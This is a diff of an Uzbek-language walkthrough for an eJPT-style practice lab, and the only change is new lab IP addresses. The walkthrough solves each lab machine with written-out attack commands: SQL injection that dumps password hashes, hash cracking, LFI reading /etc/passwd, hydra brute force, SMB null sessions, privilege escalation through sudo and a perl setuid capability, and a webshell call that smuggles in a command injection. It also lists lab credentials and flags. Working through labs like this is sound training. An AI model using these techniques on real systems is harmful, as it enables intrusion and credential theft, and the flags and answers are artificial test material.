@@ -6,29 +6,29 @@
 ## 0) Host discovery + enumeration
 
 ```bash
-nmap -sn 172.20.0.0/24                      # tirik hostlar: .10 .20 .30 (+ .5 o'zingiz)
-nmap -sV -p- 172.20.0.10 172.20.0.20 172.20.0.30
+nmap -sn 10.10.20.0/24                      # tirik hostlar: .10 .20 .30 (+ .5 o'zingiz)
+nmap -sV -p- 10.10.20.10 10.10.20.20 10.10.20.30
 ```
 
-- 172.20.0.10 — 80 (http, ACME CMS), 22 (ssh)
-- 172.20.0.20 — 21 (ftp), 22 (ssh)
-- 172.20.0.30 — 445/139 (smb), 22 (ssh)
+- 10.10.20.10 — 80 (http, ACME CMS), 22 (ssh)
+- 10.10.20.20 — 21 (ftp), 22 (ssh)
+- 10.10.20.30 — 445/139 (smb), 22 (ssh)
 
 ---
 
-## 1) web-01 (172.20.0.10) — web SQLi → hash → crack → SSH → root
+## 1) web-01 (10.10.20.10) — web SQLi → hash → crack → SSH → root
 
 Bu mashina **oson emas**: web zaifligidan foydalanib parol HASH'ini sizib
 chiqarasiz, uni buzasiz (crack), so'ng shu parol bilan SSH qilasiz.
 
 **Enum:** homepage'da ko'rsatkich yo'q — kataloglarni topish kerak:
 ```bash
-dirb http://172.20.0.10 /root/dirs.txt      # -> /search.php (yashirin), /dashboard.php, /uploads/
+dirb http://10.10.20.10 /root/dirs.txt      # -> /search.php (yashirin), /dashboard.php, /uploads/
 ```
 
 **a) SQLi (UNION) — parol HASH'larini dump qilish:** `search.php?q=` 2 ustunli (name, price):
 ```bash
-curl "http://172.20.0.10/search.php?q=%25'%20UNION%20SELECT%20username,password%20FROM%20users--%20-"
+curl "http://10.10.20.10/search.php?q=%25'%20UNION%20SELECT%20username,password%20FROM%20users--%20-"
 # -> admin    : $1$acme01$LKXfufFStU2JIHhZ8jBW2/
 #    sysadmin : $1$acme02$uiKoWRDnmr5mUs9ngQm3C.   (md5crypt — ochiq matn EMAS!)
 #    editor   : $1$acme03$xE1wR2RXoF42CJ0i6pHPh/
@@ -43,7 +43,7 @@ john --show h.txt          # -> sysadmin:Ac3m3S3rv3r!
 
 **c) SSH — buzilgan parol bilan foothold:**
 ```bash
-sshpass -p 'Ac3m3S3rv3r!' ssh sysadmin@172.20.0.10
+sshpass -p 'Ac3m3S3rv3r!' ssh sysadmin@10.10.20.10
 cat /var/www/html/user.txt
 ```
 ➡️ **USER flag:** `EJPT{w3b_upl04d_rce_www_data}`
@@ -61,26 +61,26 @@ cat /root/root.txt
 
 ---
 
-## 1a) web-easy 🟢 (172.20.0.40) — ochiq config → SSH → sudo bash → root
+## 1a) web-easy 🟢 (10.10.20.40) — ochiq config → SSH → sudo bash → root
 
 ```bash
-dirb http://172.20.0.40 /root/dirs.txt         # -> /config.old
-curl http://172.20.0.40/config.old             # -> ssh_user=deploy  ssh_pass=D3ploy2024!
-sshpass -p 'D3ploy2024!' ssh deploy@172.20.0.40
+dirb http://10.10.20.40 /root/dirs.txt         # -> /config.old
+curl http://10.10.20.40/config.old             # -> ssh_user=deploy  ssh_pass=D3ploy2024!
+sshpass -p 'D3ploy2024!' ssh deploy@10.10.20.40
 cat /home/deploy/user.txt                       # EJPT{3xp0s3d_c0nf1g_ssh}
 sudo -l                                         # (root) NOPASSWD: /bin/bash
 sudo /bin/bash
 cat /root/root.txt                              # EJPT{sud0_b4sh_3z_r00t}
 ```
 
-## 1b) web-hard 🔴 (172.20.0.50) — LFI → SSH cred → SSH → perl cap_setuid → root
+## 1b) web-hard 🔴 (10.10.20.50) — LFI → SSH cred → SSH → perl cap_setuid → root
 
 ```bash
 # view.php?page= — LFI / path traversal (docs/ dan ../ bilan chiqiladi)
-curl "http://172.20.0.50/view.php?page=../../../../etc/passwd"       # foydalanuvchilar
-curl "http://172.20.0.50/view.php?page=../../../../opt/monitor/deploy_notes.txt"
+curl "http://10.10.20.50/view.php?page=../../../../etc/passwd"       # foydalanuvchilar
+curl "http://10.10.20.50/view.php?page=../../../../opt/monitor/deploy_notes.txt"
 #   -> user: webadmin   pass: W3bM0n1t0r2024!
-sshpass -p 'W3bM0n1t0r2024!' ssh webadmin@172.20.0.50
+sshpass -p 'W3bM0n1t0r2024!' ssh webadmin@10.10.20.50
 cat /home/webadmin/user.txt                     # EJPT{lf1_l34ks_ssh_cr3ds}
 getcap -r / 2>/dev/null                          # /usr/bin/perl = cap_setuid+ep
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
@@ -89,18 +89,18 @@ cat /root/root.txt                              # EJPT{c4p_s3tu1d_p3rl_r00t}
 
 ---
 
-## 2) linux-02 (172.20.0.20) — FTP hint + SSH → SUID find → root
+## 2) linux-02 (10.10.20.20) — FTP hint + SSH → SUID find → root
 
 **a) Anonim FTP:**
 ```bash
-ftp 172.20.0.20        # user: anonymous, parol: (bo'sh)
+ftp 10.10.20.20        # user: anonymous, parol: (bo'sh)
 # get note_to_bob.txt  -> "parolingni o'zgartir — 'football' juda oddiy!"
 ```
-Yoki brute-force: `hydra -l bob -P /root/wordlist.txt ssh://172.20.0.20` → `bob:football`.
+Yoki brute-force: `hydra -l bob -P /root/wordlist.txt ssh://10.10.20.20` → `bob:football`.
 
 **b) Foothold:**
 ```bash
-sshpass -p football ssh bob@172.20.0.20
+sshpass -p football ssh bob@10.10.20.20
 cat /home/bob/user.txt
 ```
 ➡️ **USER flag:** `EJPT{ftp_ssh_cr4ck_f00th0ld}`
@@ -115,19 +115,19 @@ cat /root/root.txt
 
 ---
 
-## 3) smb-03 (172.20.0.30) — SMB null session → cred → root
+## 3) smb-03 (10.10.20.30) — SMB null session → cred → root
 
 **a) SMB enumeration (null session):**
 ```bash
-smbclient -L //172.20.0.30 -N              # share: public
-smbclient //172.20.0.30/public -N
+smbclient -L //10.10.20.30 -N              # share: public
+smbclient //10.10.20.30/public -N
 smb: \> get credentials.txt
 # -> carol : Fil3s3rv3r2025
 ```
 
 **b) Foothold:**
 ```bash
-sshpass -p Fil3s3rv3r2025 ssh carol@172.20.0.30
+sshpass -p Fil3s3rv3r2025 ssh carol@10.10.20.30
 cat /home/carol/user.txt
 ```
 ➡️ **USER flag:** `EJPT{smb_null_cr3ds_l00t}`
@@ -151,15 +151,15 @@ cat /root/root.txt
 **Eng oddiy yo'l (web-01 shell orqali):**
 ```bash
 # web-01'dagi webshell (yoki sysadmin ssh) ichki hostni ko'radi:
-curl "http://172.20.0.10/uploads/sh.php?c=curl -s http://10.10.10.20:8080/"
+curl "http://10.10.20.10/uploads/sh.php?c=curl -s http://10.10.10.20:8080/"
 # Command injection (ping ?host= zaif):
-curl "http://172.20.0.10/uploads/sh.php?c=curl -s 'http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt'"
+curl "http://10.10.20.10/uploads/sh.php?c=curl -s 'http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt'"
 ```
 
 **"Toza" pivot (proxychains + ssh dynamic port forward):**
 ```bash
 # web-01'da sysadmin bilan SOCKS proxy ochamiz:
-sshpass -p 'Ac3m3S3rv3r!' ssh -f -N -D 1080 sysadmin@172.20.0.10
+sshpass -p 'Ac3m3S3rv3r!' ssh -f -N -D 1080 sysadmin@10.10.20.10
 # /etc/proxychains.conf: socks5 127.0.0.1 1080
 proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
 ```
